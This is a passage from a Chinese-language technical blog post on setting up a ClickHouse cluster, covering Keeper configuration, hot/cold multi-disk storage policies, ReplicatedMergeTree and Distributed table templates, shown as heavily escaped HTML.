 &amp;lt;/replica&amp;gt;
 &amp;lt;!-- &amp;lt;replica&amp;gt;
 &amp;lt;host&amp;gt;172.31.10.12&amp;lt;/host&amp;gt;
 &amp;lt;port&amp;gt;9000&amp;lt;/port&amp;gt;
 &amp;lt;/replica&amp;gt; --&amp;gt;
 &amp;lt;/shard&amp;gt;
 &amp;lt;/default_cluster&amp;gt;
 &amp;lt;/remote_servers&amp;gt;
&amp;lt;/clickhouse&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关键说明:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;cluster 名字非常重要&lt;/strong&gt; 后续所有 &lt;code&gt;ON CLUSTER xxx&lt;/code&gt; 都依赖它&lt;/li&gt;
&lt;li&gt;shard ≠ replica
&lt;ul&gt;
&lt;li&gt;shard：数据水平切分&lt;/li&gt;
&lt;li&gt;replica：同一数据的副本&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="6-keeper为什么必须有---怎么配-"&gt;&lt;span&gt;6. Keeper：为什么必须有 ？ &amp;amp; 怎么配 ？&lt;/span&gt;
 &lt;a href="#6-keeper%e4%b8%ba%e4%bb%80%e4%b9%88%e5%bf%85%e9%a1%bb%e6%9c%89---%e6%80%8e%e4%b9%88%e9%85%8d-" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="61-keeper-是干什么的"&gt;&lt;span&gt;6.1. Keeper 是干什么的？&lt;/span&gt;
 &lt;a href="#61-keeper-%e6%98%af%e5%b9%b2%e4%bb%80%e4%b9%88%e7%9a%84" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Keeper&lt;/code&gt; 负责：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分布式 DDL（&lt;code&gt;ON CLUSTER&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;副本元数据&lt;/li&gt;
&lt;li&gt;表锁&lt;/li&gt;
&lt;li&gt;副本状态协调&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;没有 Keeper，集群会“看起来存在，但不能用”&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 class="heading-element" id="62-keeperxml最小可用单节点"&gt;&lt;span&gt;6.2. keeper.xml（最小可用，单节点）&lt;/span&gt;
 &lt;a href="#62-keeperxml%e6%9c%80%e5%b0%8f%e5%8f%af%e7%94%a8%e5%8d%95%e8%8a%82%e7%82%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/etc/clickhouse-server/config.d/keeper.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;clickhouse&amp;gt;
 &amp;lt;!-- Keeper 的配置，只要保持各个节点在 raft_configuration 和 zookeeper 中即可，无关顺序节点类型 --&amp;gt;
 &amp;lt;!-- Keeper 服务本身 --&amp;gt;
 &amp;lt;keeper_server&amp;gt;
 &amp;lt;!-- Keeper 对外端口 --&amp;gt;
 &amp;lt;tcp_port&amp;gt;9181&amp;lt;/tcp_port&amp;gt;
 &amp;lt;!-- 每台机器唯一，不能重复， 需要与 raft_configuration - server - id 保持一致 --&amp;gt;
 &amp;lt;server_id&amp;gt;1&amp;lt;/server_id&amp;gt;
 &amp;lt;coordination_settings&amp;gt;
 &amp;lt;operation_timeout_ms&amp;gt;10000&amp;lt;/operation_timeout_ms&amp;gt;
 &amp;lt;session_timeout_ms&amp;gt;30000&amp;lt;/session_timeout_ms&amp;gt;
 &amp;lt;/coordination_settings&amp;gt;

 &amp;lt;!-- Raft 成员（单节点也要写） --&amp;gt;
 &amp;lt;raft_configuration&amp;gt;
 &amp;lt;!-- 多少个节点(成员), 多少个 server , 其中id与对应的 server_id 保持一致 --&amp;gt;
 &amp;lt;server&amp;gt;
 &amp;lt;id&amp;gt;1&amp;lt;/id&amp;gt;
 &amp;lt;hostname&amp;gt;172.31.10.12&amp;lt;/hostname&amp;gt;
 &amp;lt;!-- 9234 是 Keeper 节点之间 Raft 通信端口 --&amp;gt;
 &amp;lt;port&amp;gt;9234&amp;lt;/port&amp;gt;
 &amp;lt;/server&amp;gt;
 &amp;lt;!-- &amp;lt;server&amp;gt;
 &amp;lt;id&amp;gt;2&amp;lt;/id&amp;gt;
 &amp;lt;hostname&amp;gt;172.31.10.12&amp;lt;/hostname&amp;gt;
 &amp;lt;port&amp;gt;9234&amp;lt;/port&amp;gt;
 &amp;lt;/server&amp;gt; --&amp;gt;
 &amp;lt;/raft_configuration&amp;gt;
 &amp;lt;/keeper_server&amp;gt;
 &amp;lt;!-- ClickHouse Server 通过这里访问 Keeper --&amp;gt;
 &amp;lt;zookeeper&amp;gt;
 &amp;lt;!-- 同样多少个节点,多少个node --&amp;gt;
 &amp;lt;node&amp;gt;
 &amp;lt;host&amp;gt;172.31.10.12&amp;lt;/host&amp;gt;
 &amp;lt;!-- 9181 是 ClickHouse Server 连接 Keeper 的端口 --&amp;gt;
 &amp;lt;port&amp;gt;9181&amp;lt;/port&amp;gt;
 &amp;lt;/node&amp;gt;
 &amp;lt;!-- &amp;lt;node&amp;gt;
 &amp;lt;host&amp;gt;172.31.10.12&amp;lt;/host&amp;gt;
 &amp;lt;port&amp;gt;9181&amp;lt;/port&amp;gt;
 &amp;lt;/node&amp;gt; --&amp;gt;
 &amp;lt;/zookeeper&amp;gt;
&amp;lt;/clickhouse&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;易错点&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;server_id&lt;/code&gt; &lt;strong&gt;每台必须不同&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Keeper 的目录 &lt;strong&gt;不要和数据目录混在一起&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;即使单节点，也必须写 &lt;code&gt;raft_configuration&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="7-多磁盘--冷热分层初始化就该做"&gt;&lt;span&gt;7. 多磁盘 / 冷热分层（初始化就该做）&lt;/span&gt;
 &lt;a href="#7-%e5%a4%9a%e7%a3%81%e7%9b%98--%e5%86%b7%e7%83%ad%e5%88%86%e5%b1%82%e5%88%9d%e5%a7%8b%e5%8c%96%e5%b0%b1%e8%af%a5%e5%81%9a" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="71-为什么要一开始就配置"&gt;&lt;span&gt;7.1. 为什么要一开始就配置？&lt;/span&gt;
 &lt;a href="#71-%e4%b8%ba%e4%bb%80%e4%b9%88%e8%a6%81%e4%b8%80%e5%bc%80%e5%a7%8b%e5%b0%b1%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;冷热分层是 &lt;strong&gt;表级能力&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;表一旦建好，后面再补策略会很痛苦&lt;/li&gt;
&lt;li&gt;Disk 在 ClickHouse 中只是&lt;strong&gt;目录抽象&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;👉 所以：&lt;strong&gt;可以先“假装有多块盘”&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 class="heading-element" id="72-storagexml"&gt;&lt;span&gt;7.2. storage.xml&lt;/span&gt;
 &lt;a href="#72-storagexml" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/etc/clickhouse-server/config.d/storage.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;clickhouse&amp;gt;
 &amp;lt;!-- ClickHouse 数据根目录 --&amp;gt;
 &amp;lt;!-- 所有表、元数据都在这里 --&amp;gt;
 &amp;lt;path&amp;gt;/data/_clickhouse/&amp;lt;/path&amp;gt;

 &amp;lt;!-- 
 sudo mkdir -p /data/_clickhouse/coordination/{log,snapshots}
 sudo chown -R clickhouse:clickhouse /data/_clickhouse
 --&amp;gt;

 &amp;lt;!-- 访问控制与权限存储路径 --&amp;gt;
 &amp;lt;!-- 此项设定实际上已过时(低版本兼容可用)，交由 user_directories.local_directory 进行控制 --&amp;gt;
 &amp;lt;!-- &amp;lt;access_control_path&amp;gt;/data/_clickhouse/access/&amp;lt;/access_control_path&amp;gt; --&amp;gt;

 &amp;lt;!-- 用户文件沙盒路径 --&amp;gt;
 &amp;lt;user_files_path&amp;gt;/data/_clickhouse/user_files/&amp;lt;/user_files_path&amp;gt;

 &amp;lt;!-- 格式结构定义路径 --&amp;gt;
 &amp;lt;format_schema_path&amp;gt;/data/_clickhouse/format_schemas/&amp;lt;/format_schema_path&amp;gt;

 &amp;lt;!-- Keeper 服务数据存储路径 --&amp;gt;
 &amp;lt;keeper_server&amp;gt;
 &amp;lt;!-- 存放 Keeper 的 Raft 事务日志 --&amp;gt;
 &amp;lt;log_storage_path&amp;gt;/data/_clickhouse/coordination/log&amp;lt;/log_storage_path&amp;gt;
 &amp;lt;!-- 存放 Keeper 的 状态快照 --&amp;gt;
 &amp;lt;snapshot_storage_path&amp;gt;/data/_clickhouse/coordination/snapshots&amp;lt;/snapshot_storage_path&amp;gt;
 &amp;lt;/keeper_server&amp;gt;

 &amp;lt;!-- 多磁盘配置 --&amp;gt;
 &amp;lt;storage_configuration&amp;gt;
 &amp;lt;!-- 定义磁盘（逻辑） --&amp;gt;
 &amp;lt;disks&amp;gt;
 &amp;lt;!-- 热数据盘（模拟 SSD） --&amp;gt;
 &amp;lt;hot&amp;gt;
 &amp;lt;type&amp;gt;local&amp;lt;/type&amp;gt;
 &amp;lt;path&amp;gt;/data/_clickhouse/hot/&amp;lt;/path&amp;gt;
 &amp;lt;/hot&amp;gt;

 &amp;lt;!-- 冷数据盘（模拟 HDD） --&amp;gt;
 &amp;lt;cold&amp;gt;
 &amp;lt;type&amp;gt;local&amp;lt;/type&amp;gt;
 &amp;lt;path&amp;gt;/data/_clickhouse/cold/&amp;lt;/path&amp;gt;
 &amp;lt;/cold&amp;gt;

 &amp;lt;/disks&amp;gt;

 &amp;lt;!-- 存储策略 --&amp;gt;
 &amp;lt;policies&amp;gt;
 &amp;lt;!-- 冷热分层策略名称 --&amp;gt;
 &amp;lt;hot_to_cold&amp;gt;
 &amp;lt;volumes&amp;gt;
 &amp;lt;!-- 新数据优先写这里 --&amp;gt;
 &amp;lt;hot_volume&amp;gt;
 &amp;lt;disk&amp;gt;hot&amp;lt;/disk&amp;gt;
 &amp;lt;/hot_volume&amp;gt;
 &amp;lt;!-- 冷数据移动到这里 --&amp;gt;
 &amp;lt;cold_volume&amp;gt;
 &amp;lt;disk&amp;gt;cold&amp;lt;/disk&amp;gt;
 &amp;lt;/cold_volume&amp;gt;
 &amp;lt;/volumes&amp;gt;
 &amp;lt;!-- hot 使用率 &amp;gt; 80% 时允许 move --&amp;gt;
 &amp;lt;move_factor&amp;gt;0.2&amp;lt;/move_factor&amp;gt;
 &amp;lt;/hot_to_cold&amp;gt;
 &amp;lt;/policies&amp;gt;
 &amp;lt;/storage_configuration&amp;gt;
&amp;lt;/clickhouse&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;所有节点的 &lt;code&gt;disk&lt;/code&gt; / &lt;code&gt;policy&lt;/code&gt; 名称必须一致&lt;/li&gt;
&lt;li&gt;后续换真实 &lt;code&gt;SSD&lt;/code&gt; / &lt;code&gt;HDD&lt;/code&gt; 只改 &lt;code&gt;path&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="8-标准建表模板冷热分层--可扩展"&gt;&lt;span&gt;8. 标准建表模板（冷热分层 + 可扩展）&lt;/span&gt;
 &lt;a href="#8-%e6%a0%87%e5%87%86%e5%bb%ba%e8%a1%a8%e6%a8%a1%e6%9d%bf%e5%86%b7%e7%83%ad%e5%88%86%e5%b1%82--%e5%8f%af%e6%89%a9%e5%b1%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="81-单副本入门--非-ha"&gt;&lt;span&gt;8.1. 单副本（入门 / 非 HA）&lt;/span&gt;
 &lt;a href="#81-%e5%8d%95%e5%89%af%e6%9c%ac%e5%85%a5%e9%97%a8--%e9%9d%9e-ha" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;CREATE TABLE dbtest.test_table
-- ON CLUSTER 在创建数据库的时候如果已指定，这儿就不需要了，否则会报告错误
-- ON CLUSTER 的作用是&amp;#34;广播执行&amp;#34;, 不是&amp;#34;持续复制&amp;#34;
ON CLUSTER default_cluster
(
 event_time DateTime,
 user_id UInt64,
 event_type String,
 payload String
)
PARTITION BY toYYYYMM(event_time)
ORDER BY (event_time, user_id)
TTL event_time &amp;#43; INTERVAL 7 DAY TO DISK &amp;#39;cold&amp;#39;
SETTINGS
 storage_policy = &amp;#39;hot_to_cold&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h3 class="heading-element" id="82-高可用版本推荐生产"&gt;&lt;span&gt;8.2. 高可用版本（推荐，生产）&lt;/span&gt;
 &lt;a href="#82-%e9%ab%98%e5%8f%af%e7%94%a8%e7%89%88%e6%9c%ac%e6%8e%a8%e8%8d%90%e7%94%9f%e4%ba%a7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;更多内容查看&lt;a href="https://blog.0x5c0f.cc/posts/linux/clickhouse%e6%9d%83%e9%99%90%e4%b8%8e%e8%ae%bf%e9%97%ae%e6%8e%a7%e5%88%b6%e8%ae%be%e8%ae%a1/#6-clickhouse-%e9%9b%86%e7%be%a4%e6%9e%b6%e6%9e%84%e8%ae%be%e8%ae%a1%e4%b8%8e%e5%85%83%e6%95%b0%e6%8d%ae%e7%ae%a1%e7%90%86"&gt;&lt;strong&gt;&amp;laquo;集群架构设计与元数据管理&amp;raquo;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;!-- 元数据托管模式; 传统手动模式 --&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!-- /etc/clickhouse-server/config.d: macros.xml --&amp;gt;
&amp;lt;clickhouse&amp;gt;
 &amp;lt;macros&amp;gt;
 &amp;lt;!-- 分片标识，用于分布式查询，同一分片需要保持一致 --&amp;gt;
 &amp;lt;shard&amp;gt;01&amp;lt;/shard&amp;gt;
 &amp;lt;!-- 副本标识符（在同一分片的副本中必须唯一） --&amp;gt;
 &amp;lt;replica&amp;gt;01_01&amp;lt;/replica&amp;gt;
 &amp;lt;/macros&amp;gt;
&amp;lt;/clickhouse&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;CREATE TABLE dbtest.test_table
-- ON CLUSTER 在创建数据库的时候如果已指定，这儿就不需要了，否则会报告错误
-- ON CLUSTER 的作用是&amp;#34;广播执行&amp;#34;, 不是&amp;#34;持续复制&amp;#34;
ON CLUSTER default_cluster
(
 event_time DateTime,
 user_id UInt64,
 event_type String,
 payload String
)
-- ReplicatedMergeTree 定义路径在非多租户的情况下，下列模板应是一个最优解
-- &amp;#39;/clickhouse/tables/{shard}/&amp;lt;db_name&amp;gt;/&amp;lt;table_name&amp;gt;&amp;#39;,&amp;#39;{replica}&amp;#39;
-- 为什么要定义路径而不默认由系统自行判定呢?
-- 注: 当前为手动模式情况下，ZK 路径指定只能在建表或者建库当中的一个指定，当前介绍的是在建表时指定的情况(传统手动模式)
-- 因为系统默认行为通常会使用类似 /clickhouse/tables/{uuid}/{shard}, 其中uuid
-- 是数据库自动生成的唯一 ID, 这会导致新节点加入时非常很难&amp;#34;自动对接&amp;#34;。 因为新节点在手动创建表时，系统也会生成一个新的随机 uuid。
-- 这意味着新节点生成的自动路径会和旧节点不一致。路径不一致，数据就永远无法自动同步,除非你自己一个个去查询主节点然后手动固定路径，非常痛苦。
ENGINE = ReplicatedMergeTree(&amp;#39;/clickhouse/tables/{shard}/dbtest/test_table&amp;#39;, &amp;#39;{replica}&amp;#39;)
PARTITION BY toYYYYMM(event_time)
ORDER BY (event_time, user_id)
TTL event_time &amp;#43; INTERVAL 7 DAY TO DISK &amp;#39;cold&amp;#39;
SETTINGS
 storage_policy = &amp;#39;hot_to_cold&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;为什么一定要 ReplicatedMergeTree？&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;扩容后自动补数据&lt;/li&gt;
&lt;li&gt;节点挂掉不丢数据&lt;/li&gt;
&lt;li&gt;支持滚动升级&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;注: 根据已搜集到的信息说明，单节点和高可用模式尽量不要混用,否则容易后期的数据同步异常(未测试)&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="9-distributed-表统一读写入口"&gt;&lt;span&gt;9. Distributed 表（统一读写入口）&lt;/span&gt;
 &lt;a href="#9-distributed-%e8%a1%a8%e7%bb%9f%e4%b8%80%e8%af%bb%e5%86%99%e5%85%a5%e5%8f%a3" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;CREATE TABLE dbtest.test_table_all
ON CLUSTER default_cluster
AS dbtest.test_table
ENGINE = Distributed(
 -- 指定该表要往哪个集群里分发数据
 default_cluster,
 -- 指定本地表所在的数据库名
 dbtest,
 -- 指定本地表的名称（数据真正存储的地方）
 test_table,
 -- 分流策略,用于决定数据流向哪个分片
 -- 随机分发: rand()
 -- 固定值分发: 1
 -- 字段直接分发: user_id
 -- 业务逻辑分发: cityHash64(user_id,...)
 -- 权重分发： 在cluster 中去定义权重
 cityHash64(user_id)
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;使用原则&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;写 → &lt;code&gt;test_table_all&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查 → &lt;code&gt;test_table_all&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;不直接访问本地表&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="10-表命名规范"&gt;&lt;span&gt;10. 表命名规范&lt;/span&gt;
 &lt;a href="#10-%e8%a1%a8%e5%91%bd%e5%90%8d%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
